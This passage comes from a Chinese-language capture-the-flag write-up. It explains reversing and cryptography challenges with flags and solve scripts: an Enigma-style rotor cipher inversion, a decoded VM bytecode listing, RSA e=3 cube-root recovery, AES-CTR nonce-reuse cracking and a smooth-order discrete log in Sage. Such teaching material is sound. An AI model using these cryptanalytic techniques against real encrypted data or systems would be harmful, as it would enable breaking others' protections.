class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以知道解题只用逐位异或0x63就行了。</p>
<p>flag: <strong>aurora{keep_c41m_4Nd_5ubmi7_F149}</strong></p>
<h3 id="要啥三轮车"><a href="#要啥三轮车" class="headerlink" title="要啥三轮车"></a>要啥三轮车</h3><p>题目算法模仿的enigma的三轮加密，实现得很辣鸡导致ida分析出的最开始的c代码是很难看的一坨，会预期之外地降低选手的游戏体验，所以在程序开始运行时打印了三轮置换表并且保留了符号表。</p>
<p>输入的字符串去掉前六位和<code>{}</code>后全部转为小写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">"%s"</span>, v175);</span><br><span class="line">v71 = (<span class="keyword">const</span> <span class="keyword">char</span> *)clearOthers(v175);</span><br><span class="line"><span class="built_in">strcpy</span>(dest, v71);</span><br><span class="line">v72 = dest;</span><br><span class="line"><span class="built_in">strcpy</span>(v175, dest);</span><br><span class="line">v73 = (<span class="keyword">const</span> <span class="keyword">char</span> *)upToDown(v175, v72);</span><br><span class="line"><span class="built_in">strcpy</span>(dest, v73);</span><br><span class="line"><span class="built_in">strcpy</span>(v175, dest);<span class="comment">//完成对输入字符串的处理</span></span><br></pre></td></tr></table></figure>
<p>每个字符先进行第一轮置换后的结果作为第二轮的输入再次置换，结果再作为第三轮的输入第三次置换得出最后的加密结果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">25</span>; ++m )<span class="comment">//第一轮</span></span><br><span class="line">&#123;</span><br><span class="line">  v74 = getL((&amp;v135)[v163]);</span><br><span class="line">  <span class="keyword">if</span> ( v74 == (<span class="keyword">unsigned</span> <span class="keyword">int</span>)getR((&amp;v135)[m]) )</span><br><span class="line">  &#123;</span><br><span class="line">    v174 = m;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">25</span>; ++n )<span class="comment">//第二轮</span></span><br><span class="line">&#123;</span><br><span class="line">  v75 = getL((&amp;v109)[v174]);</span><br><span class="line">  <span class="keyword">if</span> ( v75 == (<span class="keyword">unsigned</span> <span class="keyword">int</span>)getR((&amp;v109)[n]) )</span><br><span class="line">  &#123;</span><br><span class="line">    v173 = n;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">25</span>; ++ii )<span class="comment">//第三轮</span></span><br><span class="line">&#123;</span><br><span class="line">  v76 = getL((&amp;v83)[v173]);</span><br><span class="line">  <span class="keyword">if</span> ( v76 == (<span class="keyword">unsigned</span> <span class="keyword">int</span>)getR((&amp;v83)[ii]) )</span><br><span class="line">  &#123;</span><br><span class="line">    v173 = ii;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每输入一个字符第一轮置换表都会转动一位，每输入6个字符第二轮置换表都会转动一位，每输入36个字符第三轮置换表转动一位<del>(结果只有18个字符)</del>。</p>
<p>解题的话第一种方法是获取加密后的三轮置换表的状态，根据置换表从最后一位开始往前推算正确的flag，同时置换表反向转动；另一种方法则是爆破，因为加密是逐个进行的，flag范围也只有26个字母，最后又给出了正确flag的加密结果，完全可以逐位进行爆破，相比第一种方法而言较为省事。<del>由于出题人的解题脚本是直接拿源码改的爆破，丑的一批，所以</del>这里放出DDHV1ol3t 选手的解题脚本，有需要的同学可以作为学习的参考：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">encstr = <span class="string">'xvqxcnrankcowyxre'</span></span><br><span class="line">enc = [</span><br><span class="line">	<span class="number">0x78</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x61</span>,</span><br><span class="line">	<span class="number">0x6E</span>, <span class="number">0x6B</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x77</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x6C</span>,</span><br><span class="line">	<span class="number">0x72</span>, <span class="number">0x65</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">one_l = [<span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]</span><br><span class="line">one_r = [<span class="number">21</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">19</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">25</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">13</span>]</span><br><span class="line">two_l = [<span class="number">26</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>]</span><br><span class="line">two_r = [<span class="number">20</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">23</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">26</span>, <span class="number">17</span>]</span><br><span class="line">three_l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>]</span><br><span class="line">three_r = [<span class="number">8</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">23</span>, <span class="number">5</span>, <span class="number">24</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">25</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">	x = enc[i] - <span class="number">97</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">		<span class="keyword">if</span> three_r[x] == three_l[j]:</span><br><span class="line">			x = j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">		<span class="keyword">if</span> two_r[x] == two_l[j]:</span><br><span class="line">			x = j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">		<span class="keyword">if</span> one_r[x] == one_l[j]:</span><br><span class="line">			x = j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	flag += chr(x+<span class="number">97</span>)</span><br><span class="line">	a = three_l[<span class="number">25</span>]</span><br><span class="line">	b = three_r[<span class="number">25</span>]</span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">		j = <span class="number">24</span> - k</span><br><span class="line">		three_l[j+<span class="number">1</span>] = three_l[j]</span><br><span class="line">		three_r[j+<span class="number">1</span>] = three_r[j]</span><br><span class="line">	three_l[<span class="number">0</span>] = a</span><br><span class="line">	three_r[<span class="number">0</span>] = b</span><br><span class="line">	<span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">6</span> == <span class="number">0</span>:</span><br><span class="line">		a = two_l[<span class="number">25</span>]</span><br><span class="line">		b = two_r[<span class="number">25</span>]</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">			j = <span class="number">24</span> - k</span><br><span class="line">			two_l[j + <span class="number">1</span>] = two_l[j]</span><br><span class="line">			two_r[j + <span class="number">1</span>] = two_r[j]</span><br><span class="line">		two_l[<span class="number">0</span>] = a</span><br><span class="line">		two_r[<span class="number">0</span>] = b</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>flag: <strong>aurora{notahardcoreenigma}</strong></p>
<h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>体力活，<code>unk_602160</code>开始直到<code>602233</code>处的数据是opcode，对照opcode进入调试一步步整理出相应的指令。调试过程中可以推测出<code>v36</code>应该为vm的<code>ip</code>指针，对应opcode的数组下标<code>index</code>;<code>v37</code>应该是此vm的<code>sp</code>指针，数组<code>v46</code>则是vm模拟的栈， <code>v34</code>数组存放局部变量。整理opcode如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index:0,1,2,3</span></span><br><span class="line"><span class="number">1</span>D,  <span class="number">1</span>C, <span class="comment">//v46[sp++] = 1c						</span></span><br><span class="line"><span class="number">21</span> , <span class="number">0</span>,  <span class="comment">//v34[0] = v46[sp--]  					 </span></span><br><span class="line"><span class="comment">//==&gt;定义局部变量 n = 0x1c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:4,5,6,7</span></span><br><span class="line"><span class="number">1</span>D , <span class="number">0</span>,  <span class="comment">//v46[sp++] = 0						</span></span><br><span class="line"><span class="number">21</span>,  <span class="number">01</span>, <span class="comment">//v34[1] = v46[sp--]					</span></span><br><span class="line"><span class="comment">//==&gt;定义局部变量 i = 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:8,9,10,11</span></span><br><span class="line"><span class="number">1</span>D , <span class="number">0</span>,	 <span class="comment">//v46[sp++] = 0						</span></span><br><span class="line"><span class="number">21</span>,  <span class="number">02</span>, <span class="comment">//v34[2] = v46[sp--]					</span></span><br><span class="line"><span class="comment">//==&gt;定义局部变量 r = 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:12,13,14,15,16,17,18</span></span><br><span class="line"><span class="number">1F</span>,  <span class="number">01</span>, <span class="comment">//v46[++sp] = v34[1]					</span></span><br><span class="line"><span class="number">1F</span> , <span class="number">0</span>,  <span class="comment">//v46[++sp] = v34[0]					</span></span><br><span class="line"><span class="number">18</span>, 	 <span class="comment">// b = v46[sp--] = v34[0],				</span></span><br><span class="line">         <span class="comment">// a = v46[sp--] = v34[1],</span></span><br><span class="line">		<span class="comment">// v46[++sp] = (a &lt; b) ? TRUE : FALSE;</span></span><br><span class="line"><span class="number">1</span>C,  <span class="number">34</span>, <span class="comment">// if(v46[sp--] == FALSE) ip = 0x34;	 </span></span><br><span class="line"><span class="comment">//==&gt;if(i&lt;n) ip=0x34   若i&lt;n则跳转到index为0x34(52)处的opcode</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:19,20,21,22,23</span></span><br><span class="line"><span class="number">1F</span>,  <span class="number">01</span>, <span class="comment">//v46[++sp] = v34[1]   取局部变量i					</span></span><br><span class="line"><span class="number">1</span>E,  	 <span class="comment">//a = v46[sp--],v46[++sp]=input[a]		 </span></span><br><span class="line"><span class="number">21</span>,  <span class="number">03</span>, <span class="comment">//v34[3] = v46[sp--]					</span></span><br><span class="line"><span class="comment">//==&gt;定义局部变量b1 = input[i]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:24,25,26,27,28,29,30</span></span><br><span class="line"><span class="number">1</span>D,  B3, <span class="comment">//v46[++sp] = 0xb3</span></span><br><span class="line"><span class="number">1F</span>,  <span class="number">03</span>, <span class="comment">//v46[++sp] = v34[3]  取局部变量b1</span></span><br><span class="line"><span class="number">17</span>,  	 <span class="comment">//b = v46[sp--] = v34[3]</span></span><br><span class="line">		<span class="comment">//a = v46[sp--] = 0xb3</span></span><br><span class="line">		<span class="comment">//v46[++sp] = a ^ b</span></span><br><span class="line"><span class="number">21</span>,  <span class="number">04</span>, <span class="comment">//v34[4] = v46[sp--]</span></span><br><span class="line"><span class="comment">//==&gt;局部变量b2 = b1 ^ 0xb3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:31，32，33，34，35，36，37</span></span><br><span class="line"><span class="number">1F</span>,  <span class="number">04</span>,  <span class="comment">//v46[++sp] = v34[4]  取局部变量b2</span></span><br><span class="line"><span class="number">1</span>D,  <span class="number">06</span>,  <span class="comment">//v46[++sp] = 6</span></span><br><span class="line"><span class="number">15</span>, 	  <span class="comment">//b = v46[sp--] = 6</span></span><br><span class="line">		  <span class="comment">//a = v46[sp--] = b2</span></span><br><span class="line">		  <span class="comment">//v46[++sp] = a + b</span></span><br><span class="line"><span class="number">21</span>,  <span class="number">02</span>,  <span class="comment">//v34[2] = v46[sp--]</span></span><br><span class="line"><span class="comment">//==&gt;局部变量 r = b2 +6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:38,39,40,41,42</span></span><br><span class="line"><span class="number">1F</span>,  <span class="number">01</span>,  <span class="comment">//v46[++sp] = v34[1]  取局部变量i</span></span><br><span class="line"><span class="number">1</span>D,  <span class="number">02</span>,  <span class="comment">//v46[++sp] = 2</span></span><br><span class="line"><span class="number">20</span>,  	  <span class="comment">//a = v46[sp--] = 2</span></span><br><span class="line">		  <span class="comment">//b = v46[sp--] = v34[1]</span></span><br><span class="line">		  <span class="comment">//input[b] = v34[a]</span></span><br><span class="line"><span class="comment">//==&gt;input[i] = r</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:43，44，45，46，47，48，49</span></span><br><span class="line"><span class="number">1F</span>,  <span class="number">01</span>,  <span class="comment">//v46[++sp] = v34[1]  取局部变量i</span></span><br><span class="line"><span class="number">1</span>D,  <span class="number">01</span>,  <span class="comment">//v46[++sp] = 1</span></span><br><span class="line"><span class="number">15</span>, 	 <span class="comment">//b = v46[sp--] = 1</span></span><br><span class="line">		  <span class="comment">//a = v46[sp--] = i</span></span><br><span class="line">		  <span class="comment">//v46[++sp] = a + b = i + 1</span></span><br><span class="line"><span class="number">21</span>,  <span class="number">01</span>,   <span class="comment">//v34[1] = v46[sp--]</span></span><br><span class="line"><span class="comment">//==&gt;i++</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:50,51</span></span><br><span class="line"><span class="number">1</span>A,  <span class="number">0</span>C, <span class="comment">// ip = 0xc = 12</span></span><br><span class="line"><span class="comment">//==&gt;跳转到index为0xc(12)处的opcode</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//index:52</span></span><br><span class="line"><span class="number">24</span><span class="comment">//exit(1);</span></span><br></pre></td></tr></table></figure>
<p>可知对输入的操作为<code>input[i] = input[i]^0xb3+6</code>,写脚本可解。</p>
<p>flag:<strong>aurora{dont_kick_my_ass_QaQ}</strong> </p>
<h3 id="SimpleCheck"><a href="#SimpleCheck" class="headerlink" title="SimpleCheck"></a>SimpleCheck</h3><p>将apk文件拖进jeb，查看MainActivity：</p>
<p><img src="https://i.imgur.com/mU4yD7f.png" alt></p>
<p>主要逻辑是接收用户输入，用check函数对输入进行判断，为真则输出”You’re right!”，为假则输出”You’re wrong!”.<br>跟进check函数：</p>
<p><img src="https://i.imgur.com/4Elxpma.png" alt></p>
<p>主要逻辑：对输入的字符串长度和格式进行判断，长度需为24，格式为aurora{…}，截取flag大括号中的内容，进行三次运算后与str1数组进行对比，直接写爆破脚本：</p>
<p><img src="https://i.imgur.com/NL9ooxg.png" alt></p>
<p>得到flag为：aurora{It’s_s0_easy<em>.</em>-}</p>
<h3 id="sse"><a href="#sse" class="headerlink" title="sse"></a>sse</h3><p>用IDA打开，找关键字符串，交叉引用，找到关键代码：</p>
<p><img src="https://i.imgur.com/B35sGWt.png" alt></p>
<p>代码逻辑：首先判断flag的格式，然后将aurora{XXX}大括号中的内容进行加密，加密后的结果与一串字符串比对，相同则输入正确。<br>跟进sub_401170函数：</p>
<p><img src="https://i.imgur.com/v0PHFce.png" alt></p>
<p><img src="https://i.imgur.com/qjg8TUQ.png" alt></p>
<p>明显看出是AES加密，对比加密过程，发现没有修改，找到密文和密钥直接上代码解密就OK。<br>动态调式可以直接看到清楚的C++逻辑，基本就是源码啦！<br>密文：<br><img src="https://i.imgur.com/XedXjg0.png" alt></p>
<p>密钥：<br><img src="https://i.imgur.com/VYZPjVi.png" alt></p>
<p>最终得到flag为aurora{gotolearnsseset!}</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="naive-PRNG0"><a href="#naive-PRNG0" class="headerlink" title="naive_PRNG0"></a>naive_PRNG0</h3><p>连种子都没换过的rand()，所以无论运行多少遍结果都是一样的。记下第一个随机数，重新nc就过关了。</p>
<h3 id="naive-PRNG1"><a href="#naive-PRNG1" class="headerlink" title="naive_PRNG1"></a>naive_PRNG1</h3><p>要使用CSPRNG呀，梅森旋转生成不是呀。</p>
<p>exp暂时鸽了。</p>
<h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><p>AES-CTR with nonce reuse.</p>
<p>问题出现的问题在<code>aes = AES.new(key, AES.MODE_CTR, counter=Counter.new(128))</code>的<code>Counter.new(128)</code>。Crypto库的Counter是从0开始计数的。</p>
<p>所以问题就变成一个two-times-pad。</p>
<p>纵观以前的密码战，除了分析之外，工作量也是极为必要的。出于这个原因，我留下了剩余的工作量，但是没有把首字母换掉（不至于太缺德）。</p>
<p>顺便介绍一个python里解决mtp很好的包，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pip install mtp</span><br><span class="line">$ mtp cipher</span><br></pre></td></tr></table></figure></p>
<p>运行效果：<br><img src="https://i.imgur.com/mi04qlk.png" alt></p>
<h3 id="naive-RSA0"><a href="#naive-RSA0" class="headerlink" title="naive_RSA0"></a>naive_RSA0</h3><p>e=3而且没有padding，这里特意把q、p设置得很大这样明文里的字符也可以更多。</p>
<p>exp如下，请用sage运行：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">944596184878910952264918828296871870994376550458945115258394945073107584173702035979973230660738361172630327621960496272454672732496422999339318188654471910204601330968390297103022738364727453337362198385251002236960101361661918040202036165339768333589056299376897058446389955288838710764178850224984753171552902646225195393795307799225080145564416518846048866414832903230025434101126213440635358354082571921482391685745196953112907788290024449151917565638975172221794083323226310103637529156335586642493986830583679585356467031606826827617520244699586917709280762416539492052960415875646461061269787826714805415719407221087523366347429333359466431951024125697105154441837446345192967298375846760211673136238685670211601498001633401811874044739557854971459770000139308371923735847079684245824356397244021681401775864249234917997277489502084003352067737512704561828201328136271068595038644102118722181194583347195668067691251053156220840731855978538205474623004325770244550226446024576598163764100913061480432121098722621268264322142727933890359031944994515107982197143613130852528978999516503811882849247180413723888824177891793657425942877252813443777922029275037093577669463729857468663658489607472053947326441347663621496156430849523996631737308378819965464124022271648488670669731106892874845122219171857492966317500709601623125149582459270404072727833367221848174325753417252797977803030663910071000796065921485761373667371881974231117477486326293345034509280337329047492102332373702712930729847860908590140794394632881909406664589754236514946602386985031822790567779817767019958733916063119461518028124370795047368353084536075775490812963807687102200929357009366333899423531761526876744777870474557826455433702707417271531300381976447015421648948070517562896827512141969785080788524266986421079341505034297071816437366004796821184678981587004159684554932368186347162273669162187460727526773012212684766172397948227142470918702258745950888367048702980907081253832252716151478583409465289751306792946525476362073790584748769901990112669651234570224592274776406113846028439177811364161864432548532595676882578421605785138198330175308016530275943081455043217677343220943801192914551421746043508948550034056364914497144799658963343027337311650776739829707498952269704646163521188348922635016117695339877218590073847253055931147657012328054539970661943972262728438050114088791918421154537588547802858806161521544516620844416104046169437332233466602499701081666671571</span></span><br><span class="line">s = open(<span class="string">"cipher"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line">s = Integer(bytes_to_long(s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(long_to_bytes(long((n*i + s).nth_root(<span class="number">3</span>))))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
<h3 id="naive-SPN"><a href="#naive-SPN" class="headerlink" title="naive_SPN"></a>naive_SPN</h3><p>分析加密过程：异或-&gt;s盒代换-&gt;置换-&gt;s盒代换。</p>
<p>那么对密文进行：s盒逆变换-&gt;逆置换-&gt;s盒逆变换，就会和明文只差一个与密钥异或的过程。</p>
<p>这也就是为什么如果没有最后的异或，最后一轮加密化的原因。</p>
<p>所以要做的就是取一组明文密文，通过上述过程获得密钥，然后用密钥解密密文。</p>
<p>exp被出题人弄丢了，，，等复赛结束后写一下。</p>
<h3 id="Oracle-Lab0"><a href="#Oracle-Lab0" class="headerlink" title="Oracle_Lab0"></a>Oracle_Lab0</h3><p>参见<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/" target="_blank" rel="noopener">wiki</a>，原本不想把这题设置成烂大街的题目的，但是因为出题人疏忽，就。。。</p>
<h3 id="Oracle-Lab2"><a href="#Oracle-Lab2" class="headerlink" title="Oracle_Lab2"></a>Oracle_Lab2</h3><p>这个数字是特意选择的，因为它的阶是一个<a href="https://en.wikipedia.org/wiki/Smooth_number" target="_blank" rel="noopener">smooth number</a>，原理上来说你需要<a href="https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm" target="_blank" rel="noopener">Pohlig–Hellman algorithm</a>。实际上，看exp吧，请用sage运行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">a = <span class="number">69917405672008853891910290011307454253098253123984671213602736136565222963498304081022722430808601665643044214823807211178726883512922023974379263202802434</span></span><br><span class="line">p = <span class="number">0x0a38522d6c0b9a056801aa0cbe0329ce8457e9724acd1323f19ea310700d6e38e0252e2eb5b2ba4846259c99e0006441199cf10053471486058a4caa04156a504b</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">b = Mod(g, p)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(discrete_log(a, b))</span><br></pre></td></tr></table></figure>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018hxb/index.html" rel="next" title="代表中南大学参加“2018湖湘杯关键信息基础设施网络安全应急演练”取得优异成绩">
                <i class="fa fa-chevron-left"></i> 代表中南大学参加“2018湖湘杯关键信息基础设施网络安全应急演练”取得优异成绩
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/ACTF_2019_1/index.html" rel="prev" title="ACTF 2019 复赛 解题报告">
                ACTF 2019 复赛 解题报告 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
